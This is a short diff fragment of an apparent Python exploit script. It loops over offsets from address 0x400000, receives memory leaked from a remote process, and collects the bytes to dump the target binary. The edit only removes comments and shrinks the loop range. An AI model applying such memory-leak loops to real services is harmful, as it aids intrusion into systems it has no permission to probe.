@@ -968,14 +968,14 @@ def leak_binary_write(i,j):
 
 
     try:
-        check = r.recvline()                            #trys to recv the leak if nothin is recv inc offset by 1 and continue
+        check = r.recvline()                            
         if check:
             file.append(check[:-1])
             r.close() 
             
         else:
             r.close()
-    except:                                             #inc offset by 1 and continue
+    except:                                             
         print(sys.exc_info()[0])
         r.close()
 
@@ -983,7 +983,7 @@ def leak_binary_write(i,j):
 file = []
 offset = 0x7f                                           
 
-for i in range(0xb00):                      
+for i in range(0x100):                      
     offset = leak_binary_write(i*offset,0x400000)
     print(f'{hex(i*offset)}')
 
